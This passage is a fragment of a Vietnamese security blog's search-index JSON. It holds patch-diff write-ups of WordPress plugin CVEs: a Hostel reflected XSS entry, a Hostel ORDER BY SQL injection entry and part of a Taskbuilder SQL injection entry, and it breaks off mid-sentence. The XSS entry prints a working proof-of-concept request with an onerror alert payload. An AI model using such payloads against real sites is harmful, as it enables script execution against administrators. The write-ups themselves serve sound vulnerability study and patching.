id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) v√† v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ƒë√£ \u003cstrong\u003ex·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o\u003c/strong\u003e tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n \u003ccode\u003e'...'\u003c/code\u003e. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Hostel c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.1.5.8. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ l·ª£i d·ª•ng l·ªó h·ªïng n√†y ƒë·ªÉ t·∫•n c√¥ng ng∆∞·ªùi d√πng c√≥ quy·ªÅn cao nh∆∞ admin.\nCVE ID: CVE-2025-6234 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 1.1.5.8 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.7(vul) v√† v1.1.5.8(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n g·ªëc r·ªÖ do kh√¥ng th·ª±c hi·ªán sanitize (l√†m s·∫°ch d·ªØ li·ªáu) v√† escape (m√£ h√≥a d·ªØ li·ªáu ƒë·∫ßu ra) ƒë·ªëi v·ªõi m·ªôt tham s·ªë tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n trang, d·∫´n ƒë·∫øn l·ªó h·ªïng Reflected Cross-Site Scripting (XSS)\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü 2 file views/bookings.html.php v√† controllers/bookings.php\nFile views/bookings.html.php\n\u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt; \u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset - $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[previous page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset + $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[next page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt;\t\u0026lt;/p\u0026gt; {: file=\u0026ldquo;views/bookings.html.php v1.1.5.7\u0026rdquo; }\nTham s·ªë ob ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ $_GET['ob'] v√† echo ra HTML attribute m√† kh√¥ng c√≥ b·∫•t k√¨ x·ª≠ l√Ω escape n√†o. ƒêi·ªÅu n√†y d·∫´n ƒë·∫øn nguy c∆° Reflected XSS (Cross-Site Scripting), v√¨ attacker c√≥ th·ªÉ ch√®n payload v√†o query string,\n\u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt; \u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset - $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo esc_attr($_GET[\u0026#39;ob\u0026#39;] ?? \u0026#39;\u0026#39;)?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[previous page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset + $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo esc_attr($_GET[\u0026#39;ob\u0026#39;] ?? \u0026#39;\u0026#39;)?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[next page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt;\t\u0026lt;/p\u0026gt; {: file=\u0026ldquo;views/bookings.html.php v1.1.5.8\u0026rdquo; }\nB·∫£n v√° ƒë√£ s·ª≠ d·ª•ng h√†m esc_attr() ƒë·ªÉ encode $_GET['ob'] th√†nh d·∫°ng an to√†n tr∆∞·ªõc khi echo ra HTML attribute.\nSource: $_GET['ob'] l√† d·ªØ li·ªáu nh·∫≠p t·ª´ client (URL query string), attacker c√≥ th·ªÉ ki·ªÉm so√°t ho√†n to√†n. Sink: echo trong HTML attribute ob=\u0026lt;?php echo @$_GET['ob']?\u0026gt; üëâ V√¨ source kh√¥ng ƒëi qua logic c·ªßa controllers n√™n ta kh√¥ng c·∫ßn quan t√¢m diff c·ªßa controllers/bookings.php\nHow it work? ƒê·ªÉ $_GET['ob'] ƒë∆∞·ª£c echo ra HTML attribute c·ªßa th·∫ª \u0026lt;a\u0026gt; th√¨ ƒëi·ªÅu ki·ªán trong kh·ªëi if ch·ª©a th·∫ª \u0026lt;a\u0026gt; ph·∫£i true\n\u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; // ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; // ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt; \u0026lt;?php endif;?\u0026gt;\t{: file=\u0026ldquo;views/bookings.html.php\u0026rdquo; }\nüëâ ƒêi·ªÅu ki·ªán quan tr·ªçng c·∫ßn ch√∫ √Ω l√† if($offset \u0026gt; 0), v√¨ ch·ªâ c·∫ßn ƒëi·ªÅu ki·ªán n√†y ƒë√∫ng th√¨ XSS ƒë√£ c√≥ th·ªÉ x·∫£y ra. Kh√¥ng c·∫ßn quan t√¢m if($count \u0026gt; ($page_limit + $offset)).\nFile views/bookings.html.php kh√¥ng th·ªÉ truy c·∫≠p tr·ª±c ti·∫øp, m√† ph·∫£i ƒë∆∞·ª£c controllers g·ªçi th√¥ng qua h√†m include()\nBi·∫øn $offset ƒë∆∞·ª£c controller kh·ªüi t·∫°o tr∆∞·ªõc r·ªìi truy·ªÅn sang view (views/bookings.html.php) ƒë·ªÉ d√πng trong m·ªánh ƒë·ªÅ if.\nƒê·ªÉ x√°c ƒë·ªãnh controller n√†o g·ªçi file view n√†y, ta t√¨m ki·∫øm bi·∫øn $offset trong th∆∞ m·ª•c controllers c·ªßa plugin.\nK·∫øt qu·∫£ cho th·∫•y $offset ƒë∆∞·ª£c t·∫°o trong nh√°nh default (listing bookings) c·ªßa h√†m tƒ©nh manage() trong class WPHostelBookings, n·∫±m ·ªü file controllers/bookings.php.\nController Code\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { // other logic // list bookings default: // which bookings to show - upcoming or past? $type = empty($_GET[\u0026#39;type\u0026#39;]) ? \u0026#39;upcoming\u0026#39; : sanitize_text_field($_GET[\u0026#39;type\u0026#39;]); $offset = empty($_GET[\u0026#39;offset\u0026#39;]) ? 0 : intval($_GET[\u0026#39;offset\u0026#39;]); $dir = empty($_GET[\u0026#39;dir\u0026#39;]) ? \u0026#39;ASC\u0026#39; : $_GET[\u0026#39;dir\u0026#39;]; if($dir != \u0026#39;ASC\u0026#39; and $dir != \u0026#39;DESC\u0026#39;) $dir = \u0026#39;ASC\u0026#39;; $odir = ($dir == \u0026#39;ASC\u0026#39;) ? \u0026#39;DESC\u0026#39; : \u0026#39;ASC\u0026#39;; // other logic // define limit (as it\u0026#39;s paginated)\t$page_limit = 20; $limit_sql = empty($_GET[\u0026#39;export\u0026#39;]) ? $wpdb-\u0026gt;prepare(\u0026#34;LIMIT %d, %d\u0026#34;, $offset, $page_limit) : \u0026#39;\u0026#39;; // other logic\t$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); $count = $wpdb-\u0026gt;get_var(\u0026#34;SELECT FOUND_ROWS()\u0026#34;);\t// other logic if(@file_exists(get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;)) include get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;; else include(WPHOSTEL_PATH.\u0026#34;/views/bookings.html.php\u0026#34;);\tbreak; } } } {: file=\u0026ldquo;controllers/bookings.php v1.1.5.7\u0026rdquo; }\nPh√¢n t√≠ch bi·∫øn $offset\nBi·∫øn $offset ƒë∆∞·ª£c kh·ªüi t·∫°o t·ª´ tham s·ªë offset trong URL ($_GET['offset']):\nN·∫øu kh√¥ng c√≥ tham s·ªë =\u0026gt; m·∫∑c ƒë·ªãnh 0. N·∫øu c√≥ =\u0026gt; √©p ki·ªÉu s·ªë nguy√™n b·∫±ng intval(). $offset = empty($_GET[\u0026#39;offset\u0026#39;]) ? 0 : intval($_GET[\u0026#39;offset\u0026#39;]); Ph√¢n t√≠ch bi·∫øn $page_limit\n$page_limit ƒë∆∞·ª£c ƒë·∫∑t c·ªë ƒë·ªãnh l√† 20, d√πng k·∫øt h·ª£p v·ªõi $offset ƒë·ªÉ ph√¢n trang:\n// define limit (as it\u0026#39;s paginated)\t$page_limit = 20; // LIMIT offset, 20 $limit_sql = empty($_GET[\u0026#39;export\u0026#39;]) ? $wpdb-\u0026gt;prepare(\u0026#34;LIMIT %d, %d\u0026#34;, $offset, $page_limit) : \u0026#39;\u0026#39;; Khi ƒë√≥ SQL tr·∫£ v·ªÅ t·ªëi ƒëa 20 b·∫£n ghi, b·∫Øt ƒë·∫ßu t·ª´ v·ªã tr√≠ $offset.\n√Åp d·ª•ng v√†o m·ªánh ƒë·ªÅ if:\nTrong view, ƒëo·∫°n code XSS payload ch·ªâ hi·ªÉn th·ªã khi:\nif($offset \u0026gt; 0) =\u0026gt; t·ª©c l√† ph·∫£i c√≥ offset t·ª´ 1 tr·ªü l√™n. Mu·ªën offset \u0026gt; 0 c√≥ √Ω nghƒ©a, c∆° s·ªü d·ªØ li·ªáu ph·∫£i c√≥ √≠t nh·∫•t 2 booking. N·∫øu ch·ªâ c√≥ 1 booking th√¨ sau khi b·ªè qua 1 d√≤ng (offset=1), kh√¥ng c√≤n d·ªØ li·ªáu n√†o ƒë·ªÉ hi·ªÉn th·ªã, n√™n payload c≈©ng kh√¥ng render ra. üëâ Do ƒë√≥, ƒë·ªÉ khai th√°c th√†nh c√¥ng, c·∫ßn c√≥ t·ªëi thi·ªÉu 2 booking trong database.\nCu·ªëi c√πng c√°c k·∫øt qu·∫£ ƒë∆∞·ª£c ch·ª©a trong c√°c bi·∫øn s·∫Ω ƒë∆∞·ª£c hi·ªÉn th·ªã ra views th√¥ng qua h√†m include()\nif(@file_exists(get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;)) include get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;; else include(WPHOSTEL_PATH.\u0026#34;/views/bookings.html.php\u0026#34;);\tWPHOSTEL_PATH c√≥ th·ªÉ l√† h·∫±ng global ƒë∆∞·ª£c s·ª≠ d·ª•ng sau khi file PHP ch·ª©a n√≥ ƒë∆∞·ª£c load, ƒê·ªÉ bi·∫øt ƒë∆∞·ª£c ch√≠nh x√°c, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a WPHOSTEL_PATH.\nüëâ WPHOSTEL_PATH b√¢y gi·ªù l√† ƒë∆∞·ªùng d·∫´n tuy·ªát ƒë·ªëi t·ªõi th∆∞ m·ª•c ch·ª©a file hi·ªán t·∫°i.\nExploit Request v·ªõi XSS payload\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;offset=1\u0026amp;ob=\u0026#34;\u0026gt;\u0026lt;img+src%3D1+onerror%3Dalert%28document.domain%29\u0026gt; HTTP/1.1 Payload th·ª±c t·∫ø:\n\u0026#34;\u0026gt;\u0026lt;img src=x onerror=alert(document.domain)\u0026gt; ƒê√≥ng th·∫ª \u0026lt;a\u0026gt; b·∫±ng k√Ω t·ª± \u0026quot;\u0026gt;. Ch√®n th√™m th·∫ª \u0026lt;img\u0026gt; c√≥ thu·ªôc t√≠nh onerror ƒë·ªÉ k√≠ch ho·∫°t JavaScript. D√πng alert(document.domain) thay cho alert(1) nh∆∞ m·ªôt th√≥i quen, nh·∫±m ch·ª©ng minh r√µ r√†ng kh·∫£ nƒÉng ƒë·ªçc th√¥ng tin t·ª´ DOM. ƒêi·ªÅu n√†y c≈©ng gi√∫p tr√°nh tr∆∞·ªùng h·ª£p Sandbox Domain khi·∫øn cho t√°c ƒë·ªông c·ªßa payload b·ªã xem nh·∫π ho·∫∑c kh√¥ng c√≥. K·∫øt qu·∫£:\nConclusion L·ªó h·ªïng CVE-2025-6234 trong plugin WordPress Hostel b·∫Øt ngu·ªìn t·ª´ vi·ªác kh√¥ng x·ª≠ l√Ω ƒë√∫ng d·ªØ li·ªáu ƒë·∫ßu v√†o ($_GET['ob']) tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n giao di·ªán. ƒêi·ªÅu n√†y m·ªü ra kh·∫£ nƒÉng cho attacker ch√®n m√£ ƒë·ªôc Reflected XSS.\nB·∫£n v√° ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch s·ª≠ d·ª•ng h√†m esc_attr() ƒë·ªÉ escape d·ªØ li·ªáu tr∆∞·ªõc khi in ra HTML, ƒë·∫£m b·∫£o r·∫±ng c√°c gi√° tr·ªã kh√¥ng tin c·∫≠y kh√¥ng th·ªÉ ch√®n script ƒë·ªôc h·∫°i.\nKey takeaways:\nLu√¥n sanitize d·ªØ li·ªáu ƒë·∫ßu v√†o v√† escape d·ªØ li·ªáu ƒë·∫ßu ra theo ng·ªØ c·∫£nh (context). V·ªõi WordPress, t·∫≠n d·ª•ng c√°c h√†m built-in nh∆∞ sanitize_text_field(), esc_attr(), esc_html(), wp_kses()\u0026hellip; ƒë·ªÉ gi·∫£m thi·ªÉu r·ªßi ro b·∫£o m·∫≠t. References XSSCross-site scripting (XSS) cheat sheet - PortSwigger\nWordPress Hostel Plugin \u0026lt; 1.1.5.8 is vulnerable to Cross Site Scripting (XSS) - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-08-28-cve-2025-6234/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eHostel\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.1.5.8\u003c/strong\u003e. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ l·ª£i d·ª•ng l·ªó h·ªïng n√†y ƒë·ªÉ t·∫•n c√¥ng ng∆∞·ªùi d√πng c√≥ quy·ªÅn cao nh∆∞ \u003cstrong\u003eadmin\u003c/strong\u003e.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-6234\"\u003eCVE-2025-6234\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 1.1.5.8\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: Medium (7.1)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.7(vul) v√† v1.1.5.8(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n g·ªëc r·ªÖ do kh√¥ng th·ª±c hi·ªán \u003cstrong\u003esanitize\u003c/strong\u003e (l√†m s·∫°ch d·ªØ li·ªáu) v√† \u003cstrong\u003eescape\u003c/strong\u003e (m√£ h√≥a d·ªØ li·ªáu ƒë·∫ßu ra) ƒë·ªëi v·ªõi m·ªôt tham s·ªë tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n trang, d·∫´n ƒë·∫øn l·ªó h·ªïng \u003cstrong\u003eReflected Cross-Site Scripting (XSS)\u003c/strong\u003e\u003c/p\u003e","title":"CVE-2025-6234"},{"content":"Introduction CVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Summary: Plugin Hostel, d√πng ƒë·ªÉ qu·∫£n l√Ω ƒë·∫∑t ph√≤ng tr√™n WordPress, ch·ª©a l·ªói SQL Injection t·∫°i tham s·ªë ob trong ph·∫ßn Manage Bookings.\nBackground Hostel Plugin cho ph√©p t·∫°o trang web nh√† tr·ªç, kh√°ch s·∫°n nh·ªè ho·∫∑c BnB b·∫±ng WordPress. N√≥ cung c·∫•p:\nForm ƒë·∫∑t ph√≤ng L·ªãch ph√≤ng Qu·∫£n l√Ω bookings Exploitation Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) v√† v1.1.5.7(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Code Comparison S·ª≠ d·ª•ng diff tool so s√°nh s·ª± kh√°c bi·ªát gi·ªØa 2 version\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } {: file=\u0026ldquo;controlers/bookings.php v1.1.5.6\u0026rdquo;}\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } {: file=\u0026ldquo;controlers/bookings.php v1.1.5.7\u0026rdquo;}\nüëâ B·∫£n v√° s·ª≠ d·ª•ng whitelist ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ 'tB.id'.\nAnalysis: L·ªó h·ªïng xu·∫•t hi·ªán khi param ob ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ ORDER BY th√¥ng qua h√†m sanitize_text_field(), ch·ªâ escape m√† kh√¥ng filter SQLi.\nDetect SQLi ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); C·∫•u query n·∫±m trong nh√°nh default c·ªßa c·∫•u tr√∫c switch.\nTo√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static manage() c·ªßa class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua Plugin API (Hook System). Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m manage() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a \u0026quot;manage\u0026quot; trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file models/hostel.php ta c√≥ h√†m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } {: file=\u0026ldquo;models/hostel.php\u0026rdquo; v1.1.5.6 }\n·ªû ƒë√¢y:\nadd_menu_page() t·∫°o menu ch√≠nh trong Admin Dashboard. add_submenu_page() th√™m c√°c submenu con cho menu ƒë√≥. Tham s·ªë $callback l√† m·ªôt callback function s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu. V√≠ d·ª•:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static menu() c·ªßa class WPHostel. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m menu() ƒë∆∞·ª£c g·ªçi, ta 